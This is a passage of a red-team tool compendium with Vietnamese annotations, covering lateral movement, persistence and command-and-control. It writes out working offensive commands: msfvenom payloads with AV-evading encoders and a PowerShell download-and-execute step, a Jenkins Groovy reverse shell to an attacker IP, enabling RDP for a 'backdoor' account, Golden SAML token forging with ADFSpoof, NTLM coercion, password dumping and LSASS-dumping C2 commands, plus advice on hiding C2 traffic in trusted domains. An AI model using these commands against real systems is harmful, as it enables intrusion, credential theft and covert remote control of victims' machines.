The tool relies on **WMI Event Subscription** in order to execute a **.NET assembly** in memory, the **.NET assembly** will listen for a shellcode on a named pipe and then execute it using a variation of the thread hijacking shellcode injection.

The project is composed by two separate solutions:

- `CSharpNamedPipeLoader` - the component that will be transformed in **VBS** via **GadgetToJScript**
- `LiquidSnake` - the component responsible to creating the **WMI Event Subscription** on the remote system

**Install:**

Open both solutions in Visual Studio and build. *Make sure to target x64 architecture for the **CSharpNamedPipeLoader**.*

Output: Two separate EXEs: `CSharpNamedPipeLoader.exe` and `LiquidSnake.exe`
**Lưu ý:** Hướng dẫn biên dịch mã nguồn C# bằng **Visual Studio**. Cần tạo ra hai file thực thi riêng biệt.

Full build information can be found [tại đây](https://github.com/RiccardoAncarani/LiquidSnake#building).

**Cách sử dụng:**

Use `LiquidSnake.exe` agains a host where you have administrative access over as follows:

```bash
LiquidSnake.exe <host> [<username> <password> <domain>]
LiquidSnake.exe dc01.isengard.local
LiquidSnake.exe dc01.isengard.local saruman DeathToFrodo123 isengard.local
```
**Lưu ý:** Lệnh chạy công cụ chính `LiquidSnake.exe` trên máy attacker, kết nối đến máy **Windows** mục tiêu từ xa (`<host>`) bằng thông tin xác thực được cung cấp. Công cụ này sẽ sử dụng **WMI** để tạo một sự kiện đăng ký (event subscription) thực thi loader (`CSharpNamedPipeLoader.exe`, đã được nhúng trong VBS hoặc JScript?) trong bộ nhớ của tiến trình trên máy remote. Loader này sau đó sẽ lắng nghe trên một named pipe để nhận shellcode từ attacker.

If everything went fine, you should obtain an output similar as the following:

```bash
[*] Event filter created.
[*] Event consumer created.
[*] Subscription created, now sleeping
[*] Sending some DCOM love..
[*] Sleeping again... long day
```

General usage information can be found [tại đây](https://github.com/RiccardoAncarani/LiquidSnake#usage).

Full `LiquidSnake` usage information can be found [tại đây](https://github.com/RiccardoAncarani/LiquidSnake/tree/main/LiquidSnake).

![LiquidSnake](https://user-images.githubusercontent.com/100603074/210986763-2ffe49dd-597b-4ca2-a3ad-674b5fe39624.jpg)

*Image used from https://github.com/RiccardoAncarani/LiquidSnake#usage*

### [🔙](#tool-list)Bật **RDP**

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net localgroup "Remote Desktop Users" "backdoor" /add
```
**Lưu ý:** Bộ lệnh này được thực thi trên **CMD/PowerShell** của máy **Windows** mục tiêu để bật **Remote Desktop Protocol (RDP)** và cho phép truy cập.
`reg add ... fDenyTSConnections /d 0`: Thay đổi registry để cho phép kết nối RDP.
`netsh ... enable=Yes`: Bật quy tắc firewall tích hợp sẵn cho Remote Desktop.
`net localgroup ... /add`: Thêm một tài khoản người dùng (ở đây là 'backdoor', giả định đã tạo tài khoản này) vào nhóm "Remote Desktop Users" cục bộ để cho phép tài khoản này đăng nhập qua RDP. Cần quyền quản trị để chạy các lệnh này.

### [🔙](#tool-list)Nâng cấp shell lên **meterpreter**

Shells (https://infinitelogins.com/tag/payloads/)

After getting basic shell access to an endpoint a **meterpreter** is nicer to continue with.
**Lưu ý:** **Meterpreter** là một **payload** hậu khai thác tiên tiến của **Metasploit** cung cấp nhiều khả năng hơn **reverse shell** đơn giản.

**[attacker]** Generate a meterpreter shell:

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```
**Lưu ý:** Sử dụng `msfvenom` để tạo tệp thực thi **reverse meterpreter** cho **Windows** hoặc **Linux**. `-p` chỉ định payload, `-a` kiến trúc, `--encoder` mã hóa shellcode để né tránh **AV** (shikata_ga_nai là encoder nổi tiếng), `LHOST/LPORT` địa chỉ/cổng của attacker, `-f` định dạng output, `-o` tên file output.

![image](https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png)

**[victim]** Download to victim endpoint:

```shell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`
```
**Lưu ý:** Lệnh **PowerShell** tải tệp thực thi **shell** đã tạo về máy nạn nhân từ một web server do attacker điều khiển (`http://<ip>:8000`).

**[attacker]** Configure listener:

```shell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port run`
```
**Lưu ý:** (Đã giải thích ở trên) Thiết lập listener trong **Metasploit Framework** để nhận kết nối ngược lại từ payload **meterpreter**.

**[victim]** Execute payload:

```shell
Start-Process "shell-name.exe"`
```
**Lưu ý:** Lệnh **PowerShell** để thực thi tệp shell đã tải xuống trên máy nạn nhân. Khi chạy, nó sẽ kết nối ngược về listener của attacker.

![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)

### [🔙](#tool-list)Forwarding Ports

Sometimes, after gaining access to an endpoint there are local ports. Making these internal ports external routable can help for lateral movement to other services on the host.
**Lưu ý:** **Port forwarding** là kỹ thuật cho phép attacker truy cập các dịch vụ chỉ có sẵn trên mạng nội bộ/loopback của máy nạn nhân từ máy của attacker.

```bash
socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &
```
**Lưu ý:** Các lệnh này sử dụng **công cụ `socat`** (Socket CAT) trên máy nạn nhân (thường là **Linux**, cần cài đặt `socat`) để thực hiện **port forwarding**. `TCP-LISTEN:EXTERNAL_PORT,fork` tạo một listener TCP trên cổng `EXTERNAL_PORT` trên máy nạn nhân. Khi có kết nối đến cổng này, nó sẽ tạo một tiến trình con (`fork`) và chuyển tiếp (`TCP:127.0.0.1:INTERNAL_PORT`) kết nối đến dịch vụ đang chạy trên `127.0.0.1:INTERNAL_PORT` (ví dụ: dịch vụ web trên cổng 80 hoặc dịch vụ khác). Dấu `&` để chạy lệnh trong nền. **EXTERNAL_PORT** sẽ là cổng mà attacker kết nối tới trên máy nạn nhân, còn **INTERNAL_PORT** là cổng của dịch vụ trên máy nạn nhân.

### [🔙](#tool-list)Jenkins reverse shell

If you gain access to a **jenkins script console** you can use this to gain a **reverse shell** on the node.
**Lưu ý:** Jenkins là một server automation phổ biến. Script Console là một tính năng cho phép chạy mã Groovy tùy ý trên server hoặc agent. Nếu kẻ tấn công có quyền truy cập Script Console, họ có thể lợi dụng để có shell trên máy đó.

```jenkins
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
**Lưu ý:** Đây là mã **Groovy** (hoặc Java snippet) được thực thi trong Jenkins Script Console trên một agent **Linux/Unix**. Nó sử dụng **Java Runtime** để thực thi lệnh shell (`/bin/bash -c ...`). Lệnh bash tạo kết nối **TCP** ngược đến `IP_ADDRESS:PORT` của attacker và tạo một reverse shell tương tác qua kết nối đó. Đây là một kỹ thuật rất hiệu quả nếu Script Console không bị hạn chế.

### [🔙](#tool-list)[**ADFSpoof**](https://github.com/mandiant/ADFSpoof)

Created by Doug Bienstock [@doughsec](https://twitter.com/doughsec) while at Mandiant FireEye.

**ADFSpoof** has two main functions:

1. Given the **EncryptedPFX** blob from the **AD FS** configuration database and **DKM decryption key** from **Active Directory**, produce a usable key/cert pair for **token signing**.
2. Given a signing key, produce a signed security token that can be used to access a federated application.

This tool is meant to be used in conjunction with **ADFSDump**. **ADFSDump** runs on an **AD FS server** and outputs important information that you will need to use **ADFSpoof**.

**Install:**

**Note:** ***ADFSpoof** requires the installation of a custom fork of the **Python Cryptography package**, available [tại đây](https://github.com/dmb2168/cryptography).*
**Lưu ý:** Yêu cầu **Python** và thư viện **cryptography**, với lưu ý cần dùng một bản fork tùy chỉnh.

```bash
git clone https://github.com/mandiant/ADFSpoof
pip install -r requirements.txt
```
**Lưu ý:** Tải mã nguồn và cài đặt các dependency Python.

**Cách sử dụng:**

```bash
# Decrypt the EncryptedPFX and write to disk
python ADFSpoof.py -b EncryptedPfx.bin DKMkey.bin dump

# Generate a security token for Office365
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s sts.doughcorp.com o365 --upn robin@doughcorp.co --objectguid {1C1D4BA4-B513-XXX-XXX-3308B907D759
```
**Lưu ý:** Sử dụng **script Python ADFSpoof.py**. Công cụ này xử lý các output từ **ADFSDump** (`EncryptedPFX.bin` và `DKMkey.bin`). Chế độ `dump` trích xuất key/cert signing. Chế độ tạo token (ở đây là cho `o365` qua `sts.doughcorp.com`) sử dụng key signing để tạo một **token SAML** giả mạo với **User Principal Name (UPN)** và **ObjectGUID** của người dùng mục tiêu. **Golden SAML attack** cho phép truy cập vào các dịch vụ **Microsoft 365/Azure** như người dùng mục tiêu mà không cần mật khẩu hoặc MFA, bằng cách giả mạo việc xác thực từ **AD FS**.

Full usage information can be found [tại đây](https://github.com/mandiant/ADFSpoof#usage).

Additional command examples can be found [tại đây](https://github.com/mandiant/ADFSpoof#examples).

![image](https://user-images.githubusercontent.com/100603074/211530527-02e63fe3-5dda-4a81-8895-c140aec4eeca.png)

*Hình ảnh được sử dụng từ https://github.com/mandiant/ADFSpoof#usage*

### [🔙](#tool-list)[**Coercer**](https://github.com/p0dalirius/Coercer)

A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through many methods.

Features:

- Lists open **SMB pipes** on the remote machine (in modes scan authenticated and fuzz authenticated)
-  Tries to connect on a list of known **SMB pipes** on the remote machine (in modes scan unauthenticated and fuzz unauthenticated)
-  Calls one by one all the vulnerable **RPC** functions to coerce the server to authenticate on an arbitrary machine.
-  Random UNC paths generation to avoid caching failed attempts (all modes)
-  Configurable delay between attempts with `--delay`

More feature information [tại đây](https://github.com/p0dalirius/Coercer#features).

**Install (pip):**

```bash
sudo python3 -m pip install coercer
```
**Lưu ý:** Cài đặt công cụ từ **PyPI** bằng `pip`.

**Cách sử dụng:**

```bash
# Scan mode (Assess the Remote Procedure Calls listening on a machine)
./Coercer.py scan -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v

# Coerce mode (Exploit the Remote Procedure Calls on a remote machine to coerce an authentication to ntlmrelay or responder)
./Coercer.py coerce -l 192.168.1.2 -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v

# Fuzz mode (Fuzz Remote Procedure Calls listening on a machine)
./Coercer.py fuzz -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v
```
**Lưu ý:** Sử dụng **script Python Coercer.py** với các chế độ (`scan`, `coerce`, `fuzz`). `-t` là máy chủ Windows mục tiêu, `-l` là địa chỉ IP của listener của attacker (nơi **Responder** hoặc công cụ relay NTLM đang chạy). `-u`, `-p`, `-d` là thông tin xác thực để kết nối ban đầu (có thể không cần thiết cho một số kỹ thuật). `coerce` mode gọi các hàm **RPC** trên máy mục tiêu để buộc nó khởi tạo một kết nối **SMB/RPC** ngược về máy của attacker, nơi thông tin xác thực **NTLM hash** (của tài khoản dịch vụ hoặc máy tính) có thể bị bắt và/hoặc relay (ví dụ: NTLM relay attack).

![image](https://user-images.githubusercontent.com/100603074/216737001-3195a6c4-3d41-431d-88ce-ed35ed474d33.png)

*Hình ảnh được sử dụng từ https://github.com/p0dalirius/Coercer#quick-start*

**Collection**
====================

### [🔙](#tool-list)[**BloodHound**](https://github.com/BloodHoundAD/BloodHound)

An application used to visualize **active directory environments**. A quick way to visualise **attack paths** and understand victims' **active directory properties**.

**Install:** [PenTestPartners Walkthrough](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)
**Lưu ý:** **BloodHound** có cả client (UI) và server (database graph). Thường cần cài đặt cả hai. Wiki hoặc các hướng dẫn cài đặt chuyên sâu cung cấp các bước cụ thể (Docker, Neo4j, cách chạy ingestor...).

**Custom Queries:** [CompassSecurity BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries)
**Lưu ý:** Các truy vấn tùy chỉnh cho **BloodHound** giúp tìm kiếm các **attack path** phức tạp hoặc cụ thể trong đồ thị AD.

![image](https://user-images.githubusercontent.com/100603074/206549387-a63e5f0e-aa75-47f6-b51a-942434648ee2.png)

### [🔙](#tool-list)[**Snaffler**](https://github.com/SnaffCon/Snaffler)

**Snaffler** is an advanced **credential scanner/collector** for **Active Directory** environments. *With a great [README](https://github.com/SnaffCon/Snaffler/blob/master/README.md)*.

**Snaffler** uses a system of "classifiers", each of which examine shares or folders or files or file contents, passing some items downstream to the next classifier, and discarding others. Each classifier uses a set of rules to decide what to do with the items it classifies.

*More information about **Snaffler** [rules](https://github.com/SnaffCon/Snaffler#i-am-a-mighty-titan-of-tedium-a-master-of-the-mundane-i-wish-to-write-my-own-ruleset).*

'*Broadly speaking - it gets a list of **Windows computers** from **Active Directory**, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.*' - Snaffler README (2023)
**Lưu ý:** **Snaffler** tập trung vào việc quét các file share và nội dung file trên nhiều máy tính **Windows** trong một domain để tìm thông tin nhạy cảm.

**Install:**

You can download the binary from the [GitHub Releases Page](https://github.com/SnaffCon/Snaffler/releases).
**Lưu ý:** Tải xuống file `.exe` đã biên dịch sẵn.

**Cách sử dụng:**

```bash
# Targeted local scan (less likely to trigger detections)
Snaffler.exe -s -i C:\

# Go in loud and find everything
snaffler.exe -s -o snaffler.log
```
**Lưu ý:** Sử dụng **công cụ Snaffler.exe** với các tùy chọn. `-s` bắt đầu quá trình quét. `-i C:\` quét cục bộ từ ổ C. `-o snaffler.log` xuất kết quả ra file log. **Snaffler** sử dụng các bộ phân loại (classifiers) và luật (`rules`) để tìm kiếm. Chạy ở chế độ "loud" có thể tạo ra nhiều lưu lượng mạng và hành vi đọc file, dễ bị phát hiện bởi các biện pháp giám sát.

![image](https://user-images.githubusercontent.com/100603074/210266420-a658a48e-2945-4d06-9aff-e3fb14664829.png)

*Image used from https://github.com/SnaffCon/Snaffler#what-does-it-look-like*

### [🔙](#tool-list)[**linWinPwn**](https://github.com/lefayjey/linWinPwn)

**linWinPwn** is a **bash script** that automates a number of **Active Directory Enumeration and Vulnerability** checks.

The script uses a number of tools and serves as wrapper of them. Tools include: **impacket, bloodhound, crackmapexec, enum4linux-ng, ldapdomaindump, lsassy, smbmap, kerbrute, adidnsdump, certipy, silenthound**, and others.

**linWinPwn** is particularly useful when you have access to an **Active Directory** environment for a limited time only, and you wish to automate the enumeration process and collect evidence efficiently.
**Lưu ý:** **linWinPwn** là một script tích hợp, tự động hóa việc chạy nhiều **công cụ** khác nhau trong một pipeline để thu thập thông tin về AD. Chạy trên **Linux**, nhắm mục tiêu **Active Directory**.

**Install:**

```bash
git clone https://github.com/lefayjey/linWinPwn
cd linWinPwn; chmod +x linWinPwn.sh
chmod +x install.sh
./install.sh
```
**Lưu ý:** Cài đặt **script bash** **linWinPwn** và chạy **script cài đặt** của nó, có thể yêu cầu **Git** và các **tool** khác (impacket, bloodhound-python, crackmapexec, ...) đã được cài đặt trước.

**Cách sử dụng:**

```bash
# Default: interactive - Open interactive menu to run checks separately
./linWinPwn.sh -t <Domain_Controller_IP> [-d <AD_domain> -u <AD_user> -p <AD_password_or_hash[LM:NT]_or_kerbticket[./krb5cc_ticket]> -o <output_dir>]

# Auto config - Run NTP sync with target DC and add entry to /etc/hosts before running the modules
./linWinPwn.sh -t <Domain_Controller_IP> --auto-config

# LDAPS - Use LDAPS instead of LDAP (port 636)
./linWinPwn.sh -t <Domain_Controller_IP> --ldaps

# Module pwd_dump: Password Dump
./linWinPwn.sh -t <Domain_Controller_IP> -M pwd_dump [-d <AD_domain> -u <AD_user> -p <AD_password_or_hash[LM:NT]_or_kerbticket[./krb5cc_ticket]> -o <output_dir>]
```
**Lưu ý:** Ví dụ về cách sử dụng **script linWinPwn.sh**. `-t` chỉ định IP của **Domain Controller**. Các tùy chọn khác cho phép cung cấp thông tin xác thực domain, thư mục output, chế độ tương tác hoặc tự động, sử dụng LDAPS, hoặc chỉ chạy một module cụ thể (`-M`). Module `pwd_dump` có thể liên quan đến việc sử dụng các công cụ như **secretsdump** hoặc các phương pháp khác để **dump hash**.

Full usage information [tại đây](https://github.com/lefayjey/linWinPwn#usage).

![image](https://user-images.githubusercontent.com/100603074/216737032-57ceff01-2606-474d-a745-b39fb4997ea1.png)

*Hình ảnh được sử dụng từ https://github.com/lefayjey/linWinPwn#demos*

**Command and Control**
====================

### [🔙](#tool-list)Dự án "**Living Off Trusted Sites Project**"

**C2** implants can be detected by defenders looking for unusual network traffic to uncommon domains. Additionally proxy solutions can sometimes block connections to untrusted domains.

Being able to hide your **C2 traffic** via a trusted domain will help you to stay undetected and reduce the likelihood of being blocked at the proxy level by security solutions.

This resource contains a list of trusted sites that can be used.
**Lưu ý:** Tài nguyên này là một danh sách các **domain/subdomain** của các dịch vụ phổ biến (ví dụ: Google, Microsoft, Amazon) có thể được sử dụng để "ẩn mình" hoạt động C2 bằng cách khiến lưu lượng độc hại trông giống lưu lượng truy cập hợp pháp.

**Cách sử dụng:**

Visit [https://lots-project.com/](https://lots-project.com/)

Search for `+C&C` in the search bar to view all potential domains / subdomains that can be used for **command and control** operations.

Results include:

- raw.githubusercontent.com
- docs.google.com
- *.azurewebsites.net
- dropbox.com
- *.amazonaws.com

![image](https://user-images.githubusercontent.com/100603074/220959716-85a7f403-95af-441b-9cbf-f6c278be6652.png)

*Hình ảnh được sử dụng từ https://lots-project.com/*

### [🔙](#tool-list)[**Havoc**](https://github.com/HavocFramework/Havoc)

**Havoc** is a modern and malleable **post-exploitation command and control framework**, created by [@C5pider](https://twitter.com/C5pider).

Features include: Sleep Obfuscation, x64 return address spoofing, Indirect Syscalls for Nt* APIs

**Pre-requisites:** (Ubuntu 20.04 / 22.04)

```bash
sudo apt install build-essential
sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt update
sudo apt install python3.10 python3.10-dev
```
**Lưu ý:** Các lệnh cài đặt các gói build cần thiết và Python 3.10 trên Ubuntu. Yêu cầu quyền super user.

**Build + Usage:**

```bash
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/Client
make
./Havoc
```
**Lưu ý:** Các lệnh để clone mã nguồn và build client **Havoc** (GUI). `make` biên dịch client. Sau đó chạy tệp nhị phân **Havoc**.

**Pre-requisites:** (Ubuntu 20.04 / 22.04)

```bash
cd Havoc/Teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
```
**Lưu ý:** Các lệnh này tải các module Go cần thiết cho teamserver. Yêu cầu Go và **Git**.

**Build + Usage:**

```bash
cd Teamserver
./Install.sh
make
./teamserver -h
```
**Lưu ý:** Chạy script cài đặt (thêm tùy chọn tùy theo hệ điều hành/mong muốn), sau đó biên dịch (`make`) teamserver và xem trợ giúp.

**Run the teamserver**

```bash
sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```
**Lưu ý:** Lệnh chạy teamserver của **Havoc**. Nó lắng nghe các kết nối từ agent và xử lý chúng. `-v` và `--debug` bật chế độ chi tiết để debug. Cần quyền `sudo` để lắng nghe trên các cổng dưới 1024 nếu profile cấu hình như vậy. `--profile` chỉ định tệp cấu hình (thường là định dạng **YAML/YAOTL**) chứa các chi tiết như host, cổng, kỹ thuật che giấu,...

*Full install, build and run instructions on the [wiki](https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD)*

![image](https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png)

### [🔙](#tool-list)[**Covenant**](https://github.com/cobbr/Covenant)

**Covenant** is a **.NET command and control framework**, it has a web interface that allows for multi-user collaboration.

It can be used to remotely control compromised systems and perform a variety of different tasks, including executing arbitrary code, moving laterally through a network, and exfiltrating data, and more.

**Install (Dotnet Core):**

You can download **dotnet core** for your platform from [tại đây](https://dotnet.microsoft.com/download/dotnet-core/3.1).

**Note:** *After starting **Covenant**, you must register an initial user through the web interface. Navigating to the web interface will allow you to register the initial user*
**Lưu ý:** **Covenant** là một ứng dụng .NET Core, chạy cross-platform nhưng yêu cầu .NET Core Runtime. Nó có giao diện web để quản lý C2.

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
```
**Lưu ý:** Clone mã nguồn **Covenant** và cả các submodule của nó.

**Cách sử dụng (Dotnet Core):**

```bash
~/Covenant/Covenant > dotnet run
warn: Microsoft.EntityFrameworkCore.Model.Validation[10400]
      Sensitive data logging is enabled. Log entries and exception messages may include sensitive application data, this mode should only be enabled during development.
WARNING: Running Covenant non-elevated. You may not have permission to start Listeners on low-numbered ports. Consider running Covenant elevated.
Covenant has started! Navigate to https://127.0.0.1:7443 in a browser
```
**Lưu ý:** Lệnh `dotnet run` biên dịch và chạy dự án Covenant. Output cho thấy nó khởi động server web trên cổng 7443. Nó cảnh báo nếu không chạy với quyền nâng cao (có thể không thể lắng nghe trên các cổng đặc quyền).

**Install (Docker):**

```bash
# Build the docker image:
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
~/Covenant/Covenant > docker build -t covenant .
```
**Lưu ý:** Biên dịch **Covenant** vào một Docker image.

**Cách sử dụng (Docker):**

```bash
# Run Covenant within the Docker container
~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v </absolute/path/to/Covenant/Covenant/Data>:/app/Data covenant

# Stop the container
~/Covenant/Covenant > docker stop covenant

# Restart Covenant interactively
~/Covenant/Covenant > docker start covenant -ai
```
**Lưu ý:** Các lệnh Docker để chạy container Covenant, ánh xạ các cổng từ container ra máy host (`-p`) và mount volume để lưu trữ dữ liệu C2 bên ngoài container (`-v`). Chạy `stop` và `start` container.

Full installation and startup instructions can be found on the wiki [tại đây](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup).

![image](https://user-images.githubusercontent.com/100603074/210168138-58473fc0-4361-41ec-9439-2f2fcb159520.png)

*Image from https://github.com/cobbr/Covenant*

### [🔙](#tool-list)[**Merlin**](https://github.com/Ne0nd0g/merlin)

**Merlin** is an open-source **post-exploitation framework** that is designed to be used after a initial compromise of a system.

It is written in **Python** and can be used to perform a variety of different tasks, such as executing arbitrary code, moving laterally through a network, and exfiltrating data.
**Lưu ý:** Có vẻ thông tin mô tả này chưa được cập nhật, Merlin là framework **Golang** chứ không phải Python như miêu tả cũ này. Thông tin ở phần sau (yêu cầu Go) xác nhận điều này.

**Install:**

1. Download the latest compiled version of **Merlin Server** from the [releases](https://github.com/Ne0nd0g/merlin/releases) section
2. Extract the files with 7zip using the x function The password is: merlin
3. Start Merlin
4. Configure a [listener](https://merlin-c2.readthedocs.io/en/latest/server/menu/listeners.html)
5. Deploy an agent. See [Agent Execution Quick Start Guide](https://merlin-c2.readthedocs.io/en/latest/quickStart/agent.html) for examples

```bash
mkdir /opt/merlin;cd /opt/merlin
wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
7z x merlinServer-Linux-x64.7z
sudo ./merlinServer-Linux-x64
```
**Lưu ý:** Tải xuống và giải nén tệp **Merlin Server** đã được biên dịch sẵn cho Linux x64, sau đó chạy nó. Thường cần quyền `sudo` để chạy server nếu nó sử dụng cổng đặc quyền.

**Cách sử dụng:**

1. Ensure the **Merlin server** is running with a configured listener
2. Download and deploy an agent to the victim
3. Execute agent
**Lưu ý:** Sau khi server chạy, bạn tạo các listener, generate agent binary (sử dụng server), đưa agent lên máy nạn nhân và thực thi. Agent kết nối ngược về server để nhận lệnh.

For detailed usage information see the official Merlin [wiki](https://merlin-c2.readthedocs.io/en/latest/server/menu/main.html).

![image](https://user-images.githubusercontent.com/100603074/210168329-57c77e4f-213c-4402-8dd8-70ac3bcabcfe.png)

*Image from https://www.foregenix.com/blog/a-first-look-at-todays-command-and-control-frameworks*

### [🔙](#tool-list)[**Metasploit Framework**](https://github.com/rapid7/metasploit-framework)

**Metasploit** is an open-source framework for developing, testing, and using exploit code.

The **Metasploit framework** includes a large number of pre-built exploits and payloads, as well as a fully-featured integrated development environment (**IDE**) for creating and testing custom exploits.

**Install (Installer):**

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall
```
**Lưu ý:** Tải xuống **script cài đặt Metasploit** chính thức bằng `curl`, cấp quyền thực thi, và chạy nó. Phương pháp cài đặt được đề xuất trên các hệ thống **Linux**.

**Cách sử dụng:**

```bash
/opt/metasploit-framework/bin/msfconsole
```
**Lưu ý:** Lệnh chạy **console** chính của **Metasploit**, nơi bạn tương tác với framework. Thường được tìm thấy trong thư mục `/opt/metasploit-framework`.

Full installation instructions can be found on the official [wiki](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html).

[Rapid7 **Metasploit** blogs](https://www.rapid7.com/blog/tag/metasploit/)

[Cheat sheet graphic](https://cdn.comparitech.com/wp-content/uploads/2019/06/Metasploit-Cheat-Sheet.webp)

[Nice command list](https://github.com/security-cheatsheet/metasploit-cheat-sheet)

![image](https://user-images.githubusercontent.com/100603074/210168463-f1ac1edb-2f0e-4008-a8ba-308f3a741a9e.png)

*Image used from https://goacademy.io/how-to-install-metasploit-on-kali-linux/*

### [🔙](#tool-list)[**Pupy**](https://github.com/n1nj4sec/pupy)

**Pupy** is an opensource, cross-platform (**Windows, Linux, OSX, Android**) **C2** and **post-exploitation framework** written in python and C.

It allows an attacker to remotely control a victim's computer and execute various actions, such as command execution, key logging, and taking screen shots.

**Install (Git):**

```bash
sudo apt install git libssl1.0-dev libffi-dev python-dev python-pip build-essential swig tcpdump python-virtualenv
git clone --recursive https://github.com/n1nj4sec/pupy
cd pupy
python create-workspace.py -DG pupyw
```
**Lưu ý:** Cài đặt các dependency (bao gồm cả thư viện Python, công cụ build, tcpdump...) và sau đó clone mã nguồn của **Pupy** (bao gồm cả submodule). Cuối cùng chạy script để tạo không gian làm việc cho Pupy. Cần quyền `sudo` để cài đặt các gói hệ thống.

Roll fix to fix the error:

```bash
sudo pip2 install rpyc==3.4.4
```
**Lưu ý:** Lệnh sửa lỗi dependency cụ thể này cài đặt một phiên bản `rpyc` cho **Python 2**. Có vẻ như phần hướng dẫn cài đặt gốc có thể hơi lỗi thời hoặc dựa trên môi trường cụ thể. Pupy có thể cần Python 2 cho một số phần.

Start:

```bash
export PATH=$PATH:~/.local/bin; pupysh
pupyws/bin/pupysh
```
**Lưu ý:** Các lệnh khởi động **console Pupy** (`pupysh`) sau khi đã cấu hình không gian làm việc.

*Git install instructions used from [tại đây](https://kalitut.com/how-to-install-pupy/).*

**Install (Docker):**

For detailed docker and **pupy** installation instructions see the [wiki](https://github.com/n1nj4sec/pupy/wiki/Installation).

**Cách sử dụng:**

```bash
# Get help page for any builtin commands with -h
>> sessions -h
>> jobs -h
>> run -h

# Interact with session 1
>> sessions -i 1

# Run local command 'ls'
>> !ls
```
**Lưu ý:** Các lệnh được sử dụng trong **console Pupy** (được biểu thị bằng `>>`). Bạn có thể dùng `-h` cho bất kỳ lệnh nào để xem trợ giúp, tương tác với các phiên (`sessions -i 1`), hoặc chạy lệnh cục bộ trên máy attacker bằng cách thêm `!` phía trước (`!ls`).

Full usage information can be found on the [wiki](https://github.com/n1nj4sec/pupy/wiki/Basic-Usage).

The wiki contains good [post exploitation information](https://github.com/n1nj4sec/pupy/wiki/Post-Exploitation).

![image](https://user-images.githubusercontent.com/100603074/210181480-d1ad1bd8-fa8d-4014-842c-3efbb35b2644.png)

*Image used from https://github.com/n1nj4sec/pupy/wiki/Screenshots*

### [🔙](#tool-list)[**Brute Ratel**](https://bruteratel.com/)

**BruteRatel** is a great **command and control (C4)** framework created by [@NinjaParanoid](https://twitter.com/NinjaParanoid). The framework consists of a client component 'badger' that is installed on the compromised system, and a server component 'commander' that is run by the **red team**.

The client and server communicate with each other using various communication channels, such as HTTP, DNS, or TCP, and can be configured to use different encoding and encryption methods to evade detection.

Some nice features:

- DNS Over HTTPS
- Indirect Syscalls
- Built-in Debugger To Detect **EDR Userland Hooks**
- MITRE graph integration
- Adversary **TTP automation**

**Install:**

To legally get access to the framework you will need to buy a licence (1 Year $2500 per user). See the [pricing page](https://bruteratel.com/pricing/) for more information.
**Lưu ý:** **Brute Ratel** là một **framework C2 thương mại**, không miễn phí hoặc mã nguồn mở.

After purchase you can download the framework from [tại đây](https://bruteratel.com/tabs/download/) with your Activation Key and License User ID.

**Cách sử dụng:**

```bash
# Loads a powershell script to memory which can be Invoked using psreflect
psimport

# Locks keyboard and mouse hardware input. Use ‘unlock_input’ command to unlock
lock_input

# Dumps user clipboard
dumpclip

# Enumerates basic domain information
dcenum

# Elevates user privileges to SYSTEM (Requires admin rights)
get_system

# Takes a screenshot of current desktop and stores it on the server
screenshot

# Dumps LSASS to C:\Windows\Memory.DMP using the PssCaptureSnapshot technique
shadowclone
```
**Lưu ý:** Các lệnh ví dụ được sử dụng *bên trong console Brute Ratel*. Mỗi lệnh thực hiện một tác vụ hậu khai thác khác nhau thông qua agent (`badger`) chạy trên máy nạn nhân. Đây chỉ là một phần nhỏ các lệnh có sẵn.

Full commander terminal usage information can be found [tại đây](https://bruteratel.com/tabs/badger/badgers/).

![image](https://user-images.githubusercontent.com/100603074/210181655-74201cad-a782-43ed-97d3-f4c0926d46c3.png)

*Image used from https://bruteratel.com/*

### [🔙](#tool-list)[**NimPlant**](https://github.com/chvancooten/NimPlant)

A light-weight **first-stage C2 implant** written in **Nim**.

Features:

- Lightweight and configurable implant written in the **Nim programming language**
